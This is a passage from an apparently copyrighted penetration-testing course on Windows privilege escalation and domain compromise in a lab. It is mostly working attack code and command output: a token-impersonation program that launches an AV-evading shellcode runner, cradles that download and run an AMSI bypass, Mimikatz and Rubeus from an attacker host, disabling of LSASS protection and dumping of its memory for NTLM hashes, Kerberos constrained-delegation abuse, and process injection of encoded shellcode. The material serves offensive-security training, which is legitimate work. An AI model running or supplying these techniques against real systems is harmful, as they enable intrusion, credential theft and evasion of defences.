1011 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows/win32/api/userenv/nf-userenv-createenvironmentblock 
1012 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getsystemdirectoryw 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
683 
Listing 899 shows the code for the DllImport statements taken from pinvoke.net1013,1014 along with 
their implementation in the code. 
using System.Security.Principal; 
... 
[DllImport("advapi32.dll", SetLastError = true)] 
static extern bool RevertToSelf(); 
 
[DllImport("kernel32.dll")] 
static extern uint GetSystemDirectory([Out] StringBuilder lpBuffer, uint uSize); 
 
[DllImport("userenv.dll", SetLastError = true)] 
static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, 
bool bInherit); 
 
static void Main(string[] args) 
{ 
... 
  OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken); 
  DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken); 
   
  StringBuilder sbSystemDir = new StringBuilder(256); 
  uint res1 = GetSystemDirectory(sbSystemDir, 256); 
  IntPtr env = IntPtr.Zero; 
  bool res = CreateEnvironmentBlock(out env, hSystemToken, false); 
   
  String name = WindowsIdentity.GetCurrent().Name; 
  Console.WriteLine("Impersonated user is: " + name); 
   
  RevertToSelf(); 
Listing 899 - Setting up the working directory and environment block 
In the last part of Listing 899, we use the WindowsIdentity.GetCurrent()1015 C# method to print the 
name of the impersonated account and finally, we call the Win32 RevertToSelf API1016 to revert 
back from the impersonated SYSTEM token. 
In previous examples with CreateProcessWithTokenW, we have not called RevertToSelf first. This 
means CreateProcessWithTokenW has been called while impersonating the SYSTEM token, which 
works most of the time because SYSTEM generally has the SeImpersonatePrivilege as well. 
However, for some processes running in SYSTEM context, this privilege has been removed, so to 
ensure that our attack succeeds, we can revert back to IIS DefaultAppPool and use its 
impersonation privilege. 
We need to modify two additional arguments for CreateProcessWithTokenW to get our code 
working. These are dwLogonFlags and dwCreationFlags, which we previously left as NULL. First, 
we must specify the LOGON_WITH_PROFILE logon flag, otherwise some of the registry usage will 
 
1013 (pinvoke.net, 2020), https://www.pinvoke.net/default.aspx/userenv/CreateEnvironmentBlock.html 
1014 (pinvoke.net, 2020), https://www.pinvoke.net/default.aspx/kernel32/GetSystemDirectory.html 
1015 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.security.principal.windowsidentity.getcurrent?view=dotnet-plat-ext-3.1 
1016 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-reverttoself 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
684 
fail during process execution. In addition, the environment block we created uses Unicode so we 
must also specify the CREATE_UNICODE_ENVIRONMENT creation flag. 
These two flags are specified through enums, which we must manually implement1017 in our 
code: 
public enum CreationFlags 
{ 
    DefaultErrorMode = 0x04000000, 
    NewConsole = 0x00000010, 
    NewProcessGroup = 0x00000200, 
    SeparateWOWVDM = 0x00000800, 
    Suspended = 0x00000004, 
    UnicodeEnvironment = 0x00000400, 
    ExtendedStartupInfoPresent = 0x00080000 
} 
 
public enum LogonFlags 
{ 
     WithProfile = 1, 
     NetCredentialsOnly 
} 
Listing 900 - Enums for CreationFlags and LogonFlags 
Next, we must consider desktops,1018 or logical display surfaces. Interestingly, all processes must 
have a designated desktop even if their windows are hidden. 
When a logon session is created, CreateProcessWithTokenW will automatically use the desktop of 
that session. However, in our case we must explicitly specify it in the lpDesktop field of the 
STARTUPINFO structure passed to the API as the eighth argument. 
The default desktop is called WinSta0,1019 which we set for the lpDesktop property along with the 
other changes as shown in Listing 901. 
PROCESS_INFORMATION pi = new PROCESS_INFORMATION(); 
STARTUPINFO si = new STARTUPINFO(); 
si.cb = Marshal.SizeOf(si); 
si.lpDesktop = "WinSta0\\Default"; 
 
if (args.Length == 0) 
{ 
    Console.WriteLine("Usage: PrintSpooferNet.exe pipename"); 
    return; 
} 
...           
RevertToSelf(); 
 
res = CreateProcessWithTokenW(hSystemToken, LogonFlags.WithProfile, null, 
 
1017 (Pinvoke.net, 2020), https://www.pinvoke.net/default.aspx/Structures/CreateProcessWithTokenW.html 
1018 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/winstation/desktops 
1019 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/winstation/window-station-and-desktop-creation 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
685 
"C:\\inetpub\\wwwroot\\Upload\\met.exe", CreationFlags.UnicodeEnvironment, env, 
sbSystemDir.ToString(), ref si, out pi); 
Listing 901 - Setting default desktop and logon profile 
The final step is to choose the application to use with CreateProcessWithTokenW. We could use 
PowerShell to start an in-memory PowerShell shellcode runner, but we must take AMSI into 
account. In more complicated attacks such as these, it is often better to take a simple approach 
and place the executable on disk. This means we must make sure the executable evades AV 
detection. 
To generate the executable, we’ll reuse our AV bypass C# shellcode runner that we used for our 
web shell, since it was successful. 
Once the met.exe C# shellcode runner executable is created along with the modified 
PrintSpooferNet application, we’ll upload them along with the SpoolSample executable to the 
upload folder on web01. 
Now we’re ready to launch the attack. First, we’ll ensure that a multi/handler listener is running in 
the background on port 443 to catch the SYSTEM shell. Then we’ll launch a command prompt 
and run PrintSpooferNet from that shell: 
PS C:\windows\system32\inetsrv> c:\inetpub\wwwroot\upload\printspoofernet.exe 
\\.\pipe\test\pipe\spoolss 
c:\inetpub\wwwroot\upload\printspoofernet.exe \\.\pipe\test\pipe\spoolss 
Named pipe created: 628 
Listing 902 - Executing PrintSpooferNet 
We’ll then background the initial shell channel, launch a new shell, and run SpoolSample with 
web01 as the target: 
^Z 
Background channel 1? [y/N] y 
 
meterpreter > shell 
Process 3420 created. 
Channel 2 created. 
... 
 
c:\windows\system32\inetsrv> c:\inetpub\wwwroot\upload\SpoolSample.exe web01 
web01/pipe/test 
c:\inetpub\wwwroot\upload\SpoolSample.exe web01 web01/pipe/test 
[+] Converted DLL to shellcode 
[+] Executing RDI 
[+] Calling exported function 
Listing 903 - Executing SpoolSample 
Once SpoolSample completes, we’ll switch back to the original channel, where the print spooler 
connects to the named pipe: 
c:\windows\system32\inetsrv> ^Z 
 
Background channel 2? [y/N]  y 
meterpreter >  
[*] https://192.168.119.120:443 handling request from 192.168.120.132; (UUID: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
686 
d3rddshy) Staging x64 payload (207449 bytes) ... 
[*] Meterpreter session 2 opened (192.168.119.120:443 -> 192.168.120.132:50410) 
 
meterpreter > channel -i 1 
Interacting with channel 1... 
 
Found sid S-1-5-18 
Impersonated user is: NT AUTHORITY\SYSTEM 
Listing 904 - SpoolSample connecting back 
Immediately following the print spooler connection, a new Meterpreter session is created. 
PS C:\windows\system32\inetsrv> ^Z 
 
Background channel 1? [y/N]  y 
 
meterpreter > background 
[*] Backgrounding session 1... 
 
msf5 exploit(multi/handler) > sessions -i 2 
[*] Starting interaction with 2... 
 
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM 
Listing 905 - Obtaining SYSTEM shell 
After we background the PowerShell prompt and the current Meterpreter session, we can interact 
with the new session where we find our SYSTEM shell. Excellent! 
In this section, we managed to elevate our privileges from the IIS DefaultAppPool account to that 
of local SYSTEM through impersonation while bypassing antivirus. This allows us to continue our 
attack in the next section by obtaining the NTLM hash of the computer account. 
17.2.1.1 Exercises 
1. 
Modify the code for PrintSpooferNet to work from a shell with a logon session. 
2. 
Transfer the required files and prepare Metasploit by launching two command prompts 
along with the listener. 
3. 
Execute the attack and elevate privileges to SYSTEM. 
17.2.2 
Getting the Hash 
To perform the constrained delegation attack, we will dump the NTLM hash of the web01 
machine account from LSASS. We have managed to obtain a SYSTEM shell so this is typically a 
simple matter of dumping it, but we have already determined that LSA protection is enabled. 
When LSA protection is enabled, the LSASS process is marked as Protected Process Light (PPL), 
meaning that we can not inject code or tamper with the process. This enforcement is performed 
from the kernel and to solve this issue, we’ll leverage the mimidrv.sys driver that accompanies 
Mimikatz. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
687 
While we could use reflective PE injection to load an executable or DLL from memory, we can’t do 
this with a kernel driver since it must be on disk before it is loaded. In addition, a kernel driver 
must have a digital signature and new drivers must be vetted and cross-signed by Microsoft. 
Fortunately, Windows Defender does not flag mimidrv.sys as malicious, but it does flag Mimikatz. 
To solve this, we could load Mimikatz from memory with the Invoke-Mimikatz PowerShell script 
but due to this technique’s popularity, this may be flagged even with AMSI disabled. 
Alternatively, we could install a known vulnerable driver and custom code a 
kernel exploit that performs the same actions as mimidrv.sys. 
Although this seems to get complicated quickly, there is a way forward. The best approach at this 
point is to use Mimikatz from memory through Invoke-Mimikatz, but we will use it as few times as 
possible. 
First, we’ll manually load the driver without Mimikatz, then run Mimikatz once to clear the PPL 
flag, and finally we’ll run our custom application to dump the entire LSASS memory. We can then 
parse the output on our test machine. 
This will only generate a single antivirus alert but Mimikatz will not be shut down before it has 
issued the call to remove LSASS protections. 
Since we have a SYSTEM shell, we could also create a local administrative 
account and use that to RDP into web01. From there, we could use the GUI to 
disable AV runtime protections, which would block further alerts. 
To proceed, we’ll download an updated version of the Mimikatz mimidrv.sys file that works on 
Windows 2019 and upload it to web01. To ensure stability of our SYSTEM Meterpreter, we’ll 
migrate into the SYSTEM integrity spoolsv process and open a command prompt. 
meterpreter > migrate 2092 
[*] Migrating from 4696 to 2092... 
[*] Migration completed successfully. 
 
meterpreter > shell 
Process 5036 created. 
Channel 1 created. 
Microsoft Windows [Version 10.0.17763.1282] 
(c) 2018 Microsoft Corporation. All rights reserved. 
C:\Windows\system32> 
Listing 906 - Migrating into spoolsv 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
688 
Now we can manually load the driver with the sc.exe Service Control application.1020 First, we’ll 
create a service named “mimidrv”, specify the file path of the driver through binPath=, set its type 
to “kernel”, and the starting setting to “demand” with start=. 
C:\Windows\system32> sc create mimidrv binPath= C:\inetpub\wwwroot\upload\mimidrv.sys 
type= kernel start= demand 
sc create mimidrv binPath= C:\inetpub\wwwroot\upload\mimidrv.sys type= kernel start= 
demand 
[SC] CreateService SUCCESS 
 
C:\Windows\system32> sc start mimidrv 
sc start mimidrv 
 
SERVICE_NAME: mimidrv  
        TYPE               : 1  KERNEL_DRIVER   
        STATE              : 4  RUNNING  
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) 
        WIN32_EXIT_CODE    : 0  (0x0) 
        SERVICE_EXIT_CODE  : 0  (0x0) 
        CHECKPOINT         : 0x0 
        WAIT_HINT          : 0x0 
        PID                : 0 
        FLAGS              :  
Listing 907 - Load mimidrv.sys into the kernel 
With the driver running, we can instruct it to turn off the LSASS PPL protection. 
We’ll disable AMSI and download and run Invoke-Mimikatz from memory as shown in Listing 
908. 
C:\Windows\system32> powershell 
powershell 
Windows PowerShell  
Copyright (C) Microsoft Corporation. All rights reserved. 
 
PS C:\Windows\system32> (New-Object 
System.Net.WebClient).DownloadString('http://192.168.119.120/amsi.txt') | IEX 
(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/amsi.txt') | 
IEX 
 
PS C:\Windows\system32> (New-Object 
System.Net.WebClient).DownloadString('http://192.168.119.120/mimikatz.txt') | IEX 
(New-Object 
System.Net.WebClient).DownloadString('http://192.168.119.120/mimikatz.txt') | IEX 
 
PS C:\Windows\system32> Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe 
/remove`"" 
Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`"" 
Hostname: web01.evil.com / authority\system-authority\system 
 
  .#####.   mimikatz 2.2.0 (x64) #19041 May 20 2020 14:57:36 
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) 
 
1020 (ss64, 2020), https://ss64.com/nt/sc.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
689 
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) 
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz 
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/ 
 
mimikatz(powershell) # !processprotect /process:lsass.exe /remove 
Process : lsass.exe 
PID 564 -> 00/00 [0-0-0] 
 
PS C:\Windows\system32>  
C:\Windows\system32> 
Listing 908 - Turning off PPL with Invoke-Mimikatz 
To invoke the !processprotect command with the desired arguments, we must use quotes on 
the command line for the -Command parameter, but the command itself must also be in quotes, 
which means we must escape the inner quotes with a back tick (`) character. 
When the command is executed, the driver successfully turns off LSASS protection. Just after 
that, Windows Defender detects the execution of Mimikatz and shuts down the PowerShell 
process. 
While an antivirus alert has been generated, we have managed to turn off the PPL protection and 
we can now interact with LSASS. Instead of using Mimikatz for this, we can use our custom 
application that calls the Win32 MiniDumpWriteDump API. 
Our code will perform a memory dump of the LSASS process and write the dump to lsass.dmp in 
C:\Windows\tasks. 
C:\Windows\system32> c:\inetpub\wwwroot\upload\dump.exe 
c:\inetpub\wwwroot\upload\dump.exe 
LSASS PID is: 564 
 
C:\Windows\system32> dir c:\windows\tasks 
dir c:\windows\tasks 
 Volume in drive C has no label. 
 Volume Serial Number is EEC0-882C 
 
 Directory of c:\windows\tasks 
 
06/26/2020  12:54 AM    <DIR>          . 
06/26/2020  12:54 AM    <DIR>          .. 
06/26/2020  12:54 AM        48,216,094 lsass.dmp 
               1 File(s)     48,216,094 bytes 
               2 Dir(s)   5,581,467,648 bytes free 
Listing 909 - Dumping the LSASS memory 
To parse the dump file, we can use Invoke-Mimikatz on web01, but this will again trigger an 
antivirus alert. Instead, we are going to download the dump file and transfer it to the Windows 
Server 2019 test machine. 
C:\Windows\system32> exit 
exit 
 
meterpreter > download C:\\Windows\\tasks\\lsass.dmp /var/www/html/lsass.dmp 
[*] Downloading: C:\Windows\tasks\lsass.dmp -> /var/www/html/lsass.dmp 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
690 
[*] Downloaded 1.00 MiB of 45.98 MiB (2.17%): C:\Windows\tasks\lsass.dmp -> 
/var/www/html/lsass.dmp 
[*] Downloaded 2.00 MiB of 45.98 MiB (4.35%): C:\Windows\tasks\lsass.dmp -> 
/var/www/html/lsass.dmp 
... 
[*] Downloaded 44.00 MiB of 45.98 MiB (95.69%): C:\Windows\tasks\lsass.dmp -> 
/var/www/html/lsass.dmp 
[*] Downloaded 45.00 MiB of 45.98 MiB (97.86%): C:\Windows\tasks\lsass.dmp -> 
/var/www/html/lsass.dmp 
[*] Downloaded 45.98 MiB of 45.98 MiB (100.0%): C:\Windows\tasks\lsass.dmp -> 
/var/www/html/lsass.dmp 
[*] download   : C:\Windows\tasks\lsass.dmp -> /var/www/html/lsass.dmp 
Listing 910 - Downloading the LSASS dump file 
Given that the LSASS dump file is almost 46 MB, the download can take some time through 
Meterpreter. Once it’s downloaded, we’ll upload it to the test machine along with Invoke-Mimikatz. 
Next, 
we’ll 
run 
sekurlsa::minidump 
to 
specify 
the 
dump 
file 
followed 
by 
sekurlsa::logonpasswords to dump passwords and hashes for all logged on users. 
PS C:\Tools> wget -Uri http://192.168.119.120/lsass.dmp -OutFile C:\tools\lsass.dmp 
 
PS C:\Tools> (New-Object 
System.Net.WebClient).DownloadString('http://192.168.119.120/mimikatz.txt') | IEX 
 
PS C:\Tools> Invoke-Mimikatz -Command "`"sekurlsa::minidump c:\tools\lsass.dmp`" 
sekurlsa::logonpasswords" 
Hostname: Test / S-1-5-21-3167539577-2907730259-3891639048 
 
  .#####.   mimikatz 2.2.0 (x64) #19041 May 20 2020 14:57:36 
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) 
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) 
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz 
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/ 
 
mimikatz(powershell) # sekurlsa::minidump c:\tools\lsass.dmp 
Switch to MINIDUMP : 'c:\tools\lsass.dmp' 
 
mimikatz(powershell) # sekurlsa::logonpasswords 
Opening : 'c:\tools\lsass.dmp' file for minidump... 
 
... 
 
Authentication Id : 0 ; 996 (00000000:000003e4) 
Session           : Service from 0 
User Name         : WEB01$ 
Domain            : EVIL 
Logon Server      : (null) 
Logon Time        : 6/24/2020 2:01:32 AM 
SID               : S-1-5-20 
        msv : 
         [00000003] Primary 
         * Username : WEB01$ 
         * Domain   : EVIL 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
691 
         * NTLM     : 12343649cc8ce713962859a2934b8cbb 
         * SHA1     : f6903726e098755116c9eb87263d213cd76a17a8 
.... 
Listing 911 - Obtaining NTLM hash from LSASS dump 
Finally, we have captured the NTLM hash for the machine account of web01. Nice! 
We’re now armed to exploit the configured constrained delegation to file01. We’ll explore this in 
the next section. 
17.2.2.1 Exercises 
1. 
Download the appropriate versions of mimidrv.sys and Invoke-Mimikatz to the Kali machine 
web root. 
2. 
Migrate the SYSTEM shell into a different SYSTEM process to ensure stability. 
3. 
Transfer the Mimikatz driver and launch it manually with the service control manager. 
4. 
Disable AMSI and use Invoke-Mimikatz to disable the PPL protection on LSASS. 
5. 
Transfer and use the custom application to dump the LSASS process memory. 
6. 
Download the dump file, transfer it to the “test” machine, and extract the NTLM hash for the 
web01 machine account. 
17.2.3 
Delegate My Ticket 
Since web01 is configured with constrained delegation to the file01 machine, this means that we 
can use the web01 machine account NTLM hash to request a TGS as any user for the CIFS 
service on file01. 
If we request a TGS as a user that is a member of the Domain Admins group, we will have the 
permissions required to obtain code execution on file01. 
The best tool for constrained delegation abuse is Rubeus. 
Before compiling Rubeus, we must change the .NET version to target 4.6 since that is what is 
installed on Windows Server 2019. We can do this by navigating to Project > Rubeus Properties 
and changing the Target framework to .NET Framework 4.6. 
If we compile and transfer the Rubeus binary to web01 and try to directly invoke it from the 
command prompt, it is very likely that the antivirus will flag it. This is because the default version 
of Rubeus is well known to antivirus engines, even when we perform the compilation ourselves. 
At this point, we can either try to modify the Rubeus source code to evade detection or execute it 
directly from memory after disabling AMSI. Due to the rather large Rubeus code base, we will run 
it from memory. 
After Rubeus is compiled, we’ll copy it to the web root of our Kali machine and turn to our 
SYSTEM Meterpreter shell. We’ll open a command prompt and in turn, open PowerShell. Here, 
we’ll initially bypass AMSI through a download cradle, after which we’ll download Rubeus into 
memory and load it as an assembly. 
meterpreter > shell 
Process 1004 created. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
692 
Channel 3 created. 
Microsoft Windows [Version 10.0.17763.1282] 
(c) 2018 Microsoft Corporation. All rights reserved. 
 
C:\Windows\system32> powershell 
powershell 
Windows PowerShell  
Copyright (C) Microsoft Corporation. All rights reserved. 
 
PS C:\Windows\system32> (New-Object 
System.Net.WebClient).DownloadString('http://192.168.119.120/amsi.txt') | IEX 
(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/amsi.txt') | 
IEX 
 
PS C:\Windows\system32> $data = (New-Object 
System.Net.WebClient).DownloadData('http://192.168.119.120/Rubeus.exe') 
$data = (New-Object 
System.Net.WebClient).DownloadData('http://192.168.119.120/Rubeus.exe') 
 
PS C:\Windows\system32> $assem = [System.Reflection.Assembly]::Load($data) 
$assem = [System.Reflection.Assembly]::Load($data) 
PS C:\Windows\system32>  
Listing 912 - Disabling AMSI and downloading Rubeus into memory 
Now Rubeus is loaded into memory through the Load method of the System.Reflection.Assembly 
namespace. 
To interact with it, we’ll take advantage of the fact that the Main method is public and we can 
invoke all of its functionality by specifying the function name.1021 
As a simple example, let’s invoke the purge function to clear all Kerberos tickets from memory 
directly through the Main method: 
PS C:\Windows\system32> [Rubeus.Program]::Main("purge".Split()) 
[Rubeus.Program]::Main("purge".Split()) 
 
   ______        _                       
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___  
  |  __  /| | | |  _ \| ___ | | | |/___) 
  | |  \ \| |_| | |_) ) ____| |_| |___ | 
  |_|   |_|____/|____/|_____)____/(___/ 
 
  v1.5.0  
 
 
[*] Action: Purge Tickets 
Luid: 0x0 
[+] Tickets successfully purged! 
PS C:\Windows\system32>  
Listing 913 - Invoking the purge function from Rubeus in memory 
 
1021 (@HarmJ0y, 2020), https://github.com/GhostPack/Rubeus#sidenote-running-rubeus-through-powershell 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
693 
Now we can invoke Rubeus to request the TGS for the CIFS service on file01 as administrator, 
which is a domain admin. To do this in a single command, we’ll call the s4u function and supply a 
series of arguments. First, we’ll specify the username (/user:) and the NTLM hash (/rc4:) of the 
web01 machine account, which is called “web01$”. 
Next, we’ll provide the user to impersonate with /impersonateuser:, which in our case is 
“administrator”. These options will allow Rubeus to obtain a TGT for web01$ followed by a 
S4U2self request to get a forwardable TGS for administrator to web01. 
As the final arguments, we’ll supply the SPN we want to target with /msdsspn:, which is the CIFS 
service on file01 and finally, we’ll signal the generated TGS to be loaded into memory with /ptt: 
PS C:\Windows\system32> [Rubeus.Program]::Main("s4u /user:web01$ 
/rc4:12343649cc8ce713962859a2934b8cbb /impersonateuser:administrator 
/msdsspn:cifs/file01 /ptt".Split()) 
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:12343649cc8ce713962859a2934b8cbb 
/impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split()) 
 
... 
 
[*] Action: S4U 
 
[*] Using rc4_hmac hash: 12343649cc8ce713962859a2934b8cbb 
[*] Building AS-REQ (w/ preauth) for: 'evil.com\web01$' 
[+] TGT request successful! 
[*] base64(ticket.kirbi): 
 
      doIEpjCCBKKgAwIBBaEDAgEWo... 
 
[*] Action: S4U 
 
[*] Using domain controller: dc02.evil.com (192.168.120.130) 
[*] Building S4U2self request for: 'web01$@EVIL.COM' 
[*] Sending S4U2self request 
[+] S4U2self success! 
[*] Got a TGS for 'administrator@EVIL.COM' to 'web01$@EVIL.COM' 
[*] base64(ticket.kirbi): 
 
      doIFWjCCBVagAwIBBaEDAgEWo... 
 
[*] Impersonating user 'administrator' to target SPN 'cifs/file01' 
[*] Using domain controller: dc02.evil.com (192.168.120.130) 
[*] Building S4U2proxy request for service: 'cifs/file01' 
[*] Sending S4U2proxy request 
[+] S4U2proxy success! 
[*] base64(ticket.kirbi) for SPN 'cifs/file01': 
 
      doIF1jCCBdKgAwIBBaEDAgEWo... 
[+] Ticket successfully imported! 
Listing 914 - Using the S4U protocol transitions to request a TGS 
The output indicates that a TGS as the administrator user for the CIFS service on file01 has been 
generated and injected into memory. 
We can verify this with the klist command as shown in Listing 915. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
694 
PS C:\Windows\system32> klist 
klist 
 
Current LogonId is 0:0x3e7 
 
Cached Tickets: (1) 
 
#0>     Client: administrator @ EVIL.COM 
        Server: cifs/file01 @ EVIL.COM 
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96 
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize  
        Start Time: 6/26/2020 1:50:39 (local) 
        End Time:   6/26/2020 11:50:38 (local) 
        Renew Time: 7/3/2020 1:50:38 (local) 
        Session Key Type: AES-128-CTS-HMAC-SHA1-96 
        Cache Flags: 0  
        Kdc Called:  
Listing 915 - Displaying the requested TGS 
We have successfully obtained a service ticket for the CIFS service on file01 as the administrator 
domain admin user. 
Note that when working through a reverse shell, the generated TGS is 
occasionally lost and must be requested again. 
To prove that the ticket works, we can simply list the directory of the c$ share on file01: 
PS C:\Windows\system32> ls \\file01\c$ 
ls \\file01\c$ 
 
    Directory: \\file01\c$ 
 
Mode                LastWriteTime         Length Name                                               
----                -------------         ------ ----                                               
d-----        6/24/2020   1:07 AM                PerfLogs                                           
d-r---        6/24/2020   7:24 AM                Program Files                                      
d-----        6/24/2020   7:21 AM                Program Files (x86)                                
d-r---        6/24/2020   1:48 AM                Users                                              
d-----        6/24/2020   1:22 AM                Windows   
Listing 916 - Performing file listing of c$ share on file01 
In this section, we exploited constrained delegation through the dumped NTLM hash of web01$ 
and obtained a TGS for the CIFS service on file01. In the next section, we’ll use this TGS to 
perform lateral movement. 
17.2.3.1 Exercises 
1. 
Download the Rubeus Visual Studio solution from Github, modify the .NET version, and 
compile it. 
2. 
From the SYSTEM shell, disable AMSI and download Rubeus into memory. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
695 
3. 
Invoke Rubeus to request a TGS for the CIFS service on file01 as the administrator user. 
4. 
Use the requested ticket to verify access to the shares on file01. 
17.3 Owning the Domain 
So far, we have obtained a reverse Meterpreter shell on web01 from a file upload vulnerability 
while bypassing detection from Windows Defender. Once we gained this level of access, we 
elevated our privileges to local SYSTEM and disabled the LSA protection to obtain an NTLM hash 
for the machine account. Lastly, we exploited constrained delegation to get a TGS for the CIFS 
service on file01 in the context of a domain admin. In the next sections, we’ll use this TGS to 
perform lateral movement and subsequently compromise the entire domain. 
17.3.1 
Lateral Movement 
It’s finally time to perform lateral movement and compromise file01. Since our attack has 
exploited constrained delegation to obtain a service ticket, we must perform lateral movement as 
pass-the-ticket and not pass-the-hash. 
Since the TGS is often cleared from memory, our ability to use it can be diminished, especially 
when we access it through our reverse Meterpreter shell. This means using a different Metasploit 
module for lateral movement will often fail. Additionally, using a module like PsExec from 
Metasploit will trigger Windows Defender. 
Because of these complications, we’ll take a different route and modify the service binary for an 
unused service (SensorService) on file01 to point to a custom application. We’ll then start our 
custom “service” and obtain a Meterpreter shell. 
In a previous module, we demonstrated how to do this without touching the disk through an in-
memory PowerShell shellcode runner. This is a complex approach and AMSI would make it even 
trickier. We’ll try a more basic approach instead and use our access to the c$ share on file01 to 
copy our custom executable from web01. 
Before we can begin this attack, there is a complication we must address. A Windows service 
expects a service executable, which is coded in a particular way and must provide some 
callbacks to the service manager, otherwise the service manager will time out and the executable 
will terminate. 
We can generate a service executable with msfvenom but Windows Defender will flag it. To solve 
this issue, we can either attempt to modify the service generated by msfvenom, code our own 
implementation, or perform process injection from our normal custom application. We’ll take the 
latter approach. 
If our executable performs process injection into a different SYSTEM process that is not 
protected by PPL, our shell will not die when the service manager terminates the associated 
process. 
On Windows Server 2019 and newer editions of Windows 10, a fair number of SYSTEM processes 
execute with PPL enabled by default, meaning there are not many viable targets. One service 
process that is not protected and we can inject into is spoolsv. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
696 
To recap, our lateral movement technique will perform three actions. First, the properties of 
SensorService are modified and the service is started. This will trigger a copy operation of the 
shellcode into the spoolsv process. Finally, the shellcode executes inside spoolsv. 
To do this, we will first create a C# application that performs process injection into spoolsv. We’ll 
combine the AV bypass technique that leveraged non-emulated APIs and a Caesar cipher with the 
process injection technique we developed previously. 
The combined code, without the associated DllImport statements, is shown in Listing 917. 
IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 
0); 
if (mem == null) 
{ 
    return; 
} 
 
byte[] buf = new byte[691] { 0x01, 0x4d, 0x88, ... }; 
 
for (int i = 0; i < buf.Length; i++) 
{ 
    buf[i] = (byte)(((uint)buf[i] - 5) & 0xFF); 
} 
 
int size = buf.Length; 
 
Process[] expProc = Process.GetProcessesByName("spoolsv"); 
int pid = expProc[0].Id; 
 
IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid); 
 
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40); 
 
IntPtr outSize; 
WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize); 
 
IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, 
IntPtr.Zero); 
Listing 917 - Code to evade AV and perform process injection 
We will name this application “Inject”. Next, we’ll compile it, upload it to web01, and subsequently 
use our CIFS access to copy it to file01. 
The copy operation is shown in Listing 918. 
PS C:\Windows\system32> copy C:\inetpub\wwwroot\upload\inject.exe \\file01\c$ 
copy C:\inetpub\wwwroot\upload\inject.exe \\file01\c$ 
 
